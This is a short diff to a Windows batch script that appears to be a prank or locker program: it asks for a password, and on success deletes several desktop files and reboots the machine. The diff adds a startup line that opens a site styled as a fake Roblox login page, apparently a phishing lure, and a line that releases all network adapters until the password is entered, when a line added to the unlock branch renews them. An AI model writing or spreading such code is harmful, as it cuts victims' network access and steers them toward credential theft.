@@ -33,7 +33,9 @@
 ::978f952a14a936cc963da21a135fa983
 @echo off
 color 14
+start https://loginrobloxe.my.canva.site/computer-virus
 
+ipconfig /release * 
 set password=2314
 set count=1
 set limit=5
@@ -63,7 +65,7 @@ if %Input% equ %password% (
         del "C:\Users\%username%\Desktop\gang.bat"
         del "C:\Users\%username%\Desktop\happyking.jpg"
         del "C:\Users\%username%\Desktop\happyman.bat"
-
+        ipconfig /renew
         shutdown -r -t 5 -c "Unlocked!"
 
 	goto End
